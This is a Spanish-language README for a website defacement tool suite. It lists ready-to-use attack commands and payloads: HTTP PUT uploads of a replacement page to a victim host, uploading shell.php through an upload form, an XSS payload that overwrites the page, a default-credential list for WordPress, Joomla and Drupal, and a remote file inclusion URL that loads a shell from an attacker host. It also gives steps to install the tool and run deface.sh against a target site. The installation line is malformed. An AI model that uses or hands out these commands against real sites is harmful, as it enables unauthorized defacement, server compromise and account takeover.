## Defacement web; 

modifica o reemplaza el contenido de un sitio web sin autorización

## Metodos mas usados para deface web 

## 1.- Metodo PUT

curl -X PUT -d "@index25.htm" http://victima.com/index.htm

## 2.-Metodo SQLi Inyección SQL

curl -s "${URL}${VULN_PATH}${TEST_PAYLOAD}

## 3.- Metodo upload, subir una shell.php

curl -F "file=@shell.php" http://victima.com/upload

## 4.- Metodo XSS

<script>document.body.innerHTML = "HACKED";</script>

## 5 - Metodo Vulnerabilidades en CMS (WordPress, Joomla, Drupal), credenciales debiles

Usuarios: admin, wordpress, drupal, jomla, manager, administrator .. ,-  Claves: admin, joomla, drupal, wordpress, 123456, password

## 6.- Metodo remote File Inclusion (RFI) / Local File Inclusion (LFI)

http://victima.com/index.php?page=http://atacante.com/shell.php

#

## Defacement WEB suite por HTTP Method PUT OPTIONS POST OSVDB-397

curl -k -X PUT -T "/tmp/index25.htm" "https://IP/index25.htm" -vv

## Instalación:

apt-get install #https://github.com/hackingyseguridad/webdeface

cd webdeface

chmod 777 *

Uso:

sh deface.sh http://paginaobjetivo.com/

## Test HTTP Method PUT OPTIONS POST, activo:

sh testurl.sh fqdn

El método HTTP PUT normalmente se usa para cargar datos que se guardan en el servidor web en una URL proporcionada por el usuario. Si está habilitado, un atacante puede colocar contenido en la aplicación Web. Dependiendo de la configuración del servidor, esto puede llevar a un compromiso de otros usuarios (mediante la carga de scripts ejecutables por el cliente), el compromiso del servidor (al cargar el código ejecutable del servidor) u otros ataques.


http://www.hackingyseguridad.com/secure/index2.htm

